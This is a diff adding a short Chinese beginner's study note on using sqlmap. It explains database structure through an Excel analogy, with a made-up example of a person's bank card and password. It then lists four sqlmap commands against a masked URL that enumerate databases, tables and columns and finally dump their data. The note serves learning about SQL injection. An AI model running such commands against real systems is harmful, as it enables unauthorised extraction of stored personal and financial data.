@@ -1,0 +1,13 @@
+                                                                         借助工具的简单sql      
+这周学的东西很杂，但是我觉得是个好的开始，学了一点github，还有一点php，但是我总是觉得我没有效率，加油吧少年！！
+     今天也是工具sqlmap，用这个首先要了解数据库的结构
+0x01
+    我认识的数据库的结构像excel一样，一行一行的表格，表格里面都存储这数据，一大张表格叫做数据库，还有表单，栏，字段
+举个例子，就像是张三，19岁，1990年9月9日出生，四川成都人，银行卡号:11111111111111 密码：xxxxxx。各种数据的存储在一张表格中，我的了解局限这么多
+0x02
+   我用sqlmap尝试用过几次sqlmap.py
+1. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1  --dbs
+2. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名  --tables
+3. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名 -T  表单名  --column
+4. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名 -T 表单名 -C 栏名 --dump
+12
